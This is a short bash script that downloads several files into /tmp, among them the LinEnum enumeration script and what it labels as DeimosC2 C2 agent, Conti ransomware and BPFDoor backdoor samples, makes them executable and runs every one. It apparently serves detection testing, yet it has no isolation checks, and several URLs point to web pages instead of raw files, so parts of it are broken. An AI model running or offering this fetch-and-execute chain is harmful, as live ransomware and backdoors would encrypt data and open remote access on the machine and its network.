#!/bin/bash

# Directory to store downloaded files
DOWNLOAD_DIR="/tmp/malware_samples"
mkdir -p $DOWNLOAD_DIR

# Function to download a file
function download_file() {
    local url=$1
    local output_path=$2
    echo "Downloading: $url"
    curl -o $output_path $url
    chmod +x $output_path
}

# WildFire Test File
WILDFIRE_TEST_URL="https://docs.paloaltonetworks.com/advanced-wildfire/administration/configure-advanced-wildfire-analysis/verify-wildfire-submissions/test-a-sample-malware-file"
WILDFIRE_TEST_FILE="$DOWNLOAD_DIR/wildfire_test_file.txt"
download_file $WILDFIRE_TEST_URL $WILDFIRE_TEST_FILE

# LinEnum Script
LINENUM_URL="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
LINENUM_FILE="$DOWNLOAD_DIR/LinEnum.sh"
download_file $LINENUM_URL $LINENUM_FILE

# C2 Agent Sample
C2_AGENT_URL="https://github.com/timb-machine/linux-malware/blob/main/malware/binaries/Unix.Backdoor.DeimosC2/05e9fe8e9e693cb073ba82096c291145c953ca3a3f8b3974f9c66d15c1a3a11d.elf.x86_64"
C2_AGENT_FILE="$DOWNLOAD_DIR/DeimosC2.elf"
download_file $C2_AGENT_URL $C2_AGENT_FILE

# Conti Ransomware Sample
CONTI_URL="https://github.com/timb-machine/linux-malware/blob/main/malware/binaries/Conti/bb64b27bff106d30a7b74b3589cc081c345a2b485a831d7e8c8837af3f238e1e.elf.x86_64"
CONTI_FILE="$DOWNLOAD_DIR/Conti.elf"
download_file $CONTI_URL $CONTI_FILE

# BPFDoor Sample
BPFD_URL="https://github.com/timb-machine/linux-malware/blob/main/malware/binaries/BPFDoor/07ecb1f2d9ffbd20a46cd36cd06b022db3cc8e45b1ecab62cd11f9ca7a26ab6d.elf.x86_64"
BPFD_FILE="$DOWNLOAD_DIR/BPFDoor.elf"
download_file $BPFD_URL $BPFD_FILE

# Execute the downloaded scripts and files
# Execute WildFire Test File (if applicable)
echo "Attempting to execute WildFire test file..."
chmod +x $WILDFIRE_TEST_FILE
$WILDFIRE_TEST_FILE

# Execute LinEnum Script
echo "Executing LinEnum..."
$LINENUM_FILE

# Execute C2 Agent Sample
echo "Executing C2 Agent Sample..."
$C2_AGENT_FILE

# Execute Conti Ransomware Sample
echo "Executing Conti Ransomware Sample..."
$CONTI_FILE

# Execute BPFDoor Sample
echo "Executing BPFDoor Sample..."
$BPFD_FILE
